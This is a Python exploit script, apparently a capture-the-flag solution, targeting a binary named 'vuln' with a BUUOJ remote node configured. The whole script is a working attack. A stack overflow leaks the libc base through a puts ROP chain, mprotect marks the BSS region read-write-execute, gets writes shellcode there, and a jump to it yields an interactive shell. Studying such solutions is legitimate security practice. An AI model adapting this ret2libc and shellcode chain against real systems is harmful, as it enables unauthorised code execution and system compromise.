# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './vuln'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0



if local == 1 :
    r = remote("node3.buuoj.cn","27379")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    r = ctx.start()

def pwn():
  pop_rdi_ret = 0x0000000000400663
  main_addr = 0x00000000004005DC
  bss_start_addr = 0x00601000
  shellcode_addr = 0x00602000-0x100

  #########  step1 : leak_libc
  payload = 'c'*40
  payload+= p64(pop_rdi_ret)
  payload+= p64(elf.got['puts'])
  payload+= p64(elf.plt['puts'])
  payload+= p64(main_addr)
  r.recvuntil("Input:")
  r.sendline(payload)
  r.recvline()
  leak_addr = u64((r.recvline().split("\x0a")[0]).ljust(8,'\x00'))
  libc.address = leak_addr - libc.sym['puts']
  success("libc_base = 0x%x",libc.address)
  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep ": pop rsi ; ret"
  pop_rsi_ret = libc.address + 0x00000000000202e8
  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep ": pop rdx ; ret"
  pop_rdx_ret = libc.address + 0x0000000000001b92



  #########  step2 : mprotect_bss_to_rwx
  payload = 'c'*40
  payload+= p64(pop_rdi_ret)
  payload+= p64(bss_start_addr)
  payload+= p64(pop_rsi_ret)
  payload+= p64(0x1000)
  payload+= p64(pop_rdx_ret)
  payload+= p64(0x7)                    # RWX！！
  payload+= p64(libc.sym['mprotect'])   # mprotect(address,length,0x7)
  payload+= p64(main_addr)

  r.recvuntil("Input:")
  r.sendline(payload)


  #########  step3 : gets_shellcode_to_bss
  payload = 'c'*40
  payload+= p64(pop_rdi_ret)
  payload+= p64(shellcode_addr)   # gets_ptr->adder
  payload+= p64(libc.sym['gets'])
  payload+= p64(main_addr)

  r.recvuntil("Input:")
  r.sendline(payload)
  sleep(0.5)

  r.sendline(asm(shellcraft.amd64.linux.sh()))
  # asm()汇编转换机器码
  # shellcraft.sh()   默认会自己去寻找context.binary = './vuln'
  # shellcraft.i386.linux.sh()  x32
  # shellcraft.amd64.linux.sh() x64


  payload = cyclic(40)  # padding
  payload+= p64(shellcode_addr)
  r.recvuntil("Input:")
  r.sendline(payload)

  r.interactive()

pwn()
